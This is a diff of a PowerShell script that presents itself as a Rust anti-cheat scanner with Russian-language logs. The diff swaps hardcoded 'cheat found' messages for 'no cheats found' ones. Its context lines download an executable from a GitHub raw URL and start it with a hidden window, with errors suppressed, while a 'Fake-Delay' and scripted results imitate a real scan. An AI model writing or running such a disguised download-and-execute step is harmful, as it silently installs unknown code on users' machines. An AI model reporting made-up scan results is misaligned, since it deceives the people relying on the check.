@@ -167,7 +167,7 @@ $scan = {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
     Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
     Fake-Delay 4000
-    Log "Присутствует известная сигнатура читов." "Red"
+    Log "Известные сигнатуры отсутствуют." "Lime"
     $progress.Value = 70
 
     Log "Этап 4/5: Проверка Easy Anti-Cheat (EAC)..."
@@ -185,10 +185,8 @@ $scan = {
     
 
     Log "╔══════════════════════════════════════════════════════════════╗" "Cyan"
-    Log "║НАЙДЕН ПОДОЗРИТЕЛЬНЫЙ ФРАГМЕНТ ПАМЯТИ, КОТОРЫЙ ВОЗМОЖНО СВЯЗАН║" "Red"
-    Log "║                           С ЧИТАМИ                           ║" "Red"
+    Log "║                          Читы не найдены                     ║" "Lime"
     Log "╚══════════════════════════════════════════════════════════════╝" "Cyan"
-    Log "Система скорее всего содержит в себе чит." "Red"
     Log "Facepunch Anti-Cheat: ЗАЩИТА АКТИВНА" "Cyan"
 
     $btn.Enabled = $true
